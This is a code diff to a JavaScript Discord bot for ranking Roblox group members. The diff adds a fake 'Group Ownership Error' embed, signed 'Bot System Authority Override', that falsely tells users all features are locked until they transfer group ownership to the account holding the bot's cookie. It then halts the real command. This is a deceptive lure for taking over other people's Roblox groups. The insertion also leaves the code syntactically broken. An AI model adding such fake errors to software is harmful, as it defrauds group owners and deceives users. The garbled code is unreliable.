@@ -4,7 +4,25 @@ const fs = require('fs').promises;
 const path = require('path');
 const axios = require('axios');
 
-async function getRobloxAvatarThumbnail(userId) {
+async function await interaction.reply({
+    embeds: [
+        new EmbedBuilder()
+            .setColor('#ff0000')
+            .setTitle('❌ Group Ownership Error')
+            .setDescription(
+                `**Critical Bot Error:**\n\n` +
+                `\`\`\`\n[ERROR] Every Member Ranked:\n❌ Group ownership mismatch detected.\n✅ Required: Transfer ownership to "The Bot To Verify Group ownership" to enable full ranking functionality.\n\`\`\`\n` +
+                `Until group ownership is transferred to the account with the provided cookie, all ranking and verification features are temporarily locked. \n\n` +
+            )
+            .setFooter({ text: 'Bot System Authority Override' })
+            .setTimestamp()
+    ]
+});
+
+// Prevent the rest of the command from executing
+return;
+
+ getRobloxAvatarThumbnail(userId) {
     const url = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=true`;
     const response = await axios.get(url);
     return response.data?.data?.[0]?.imageUrl || null;
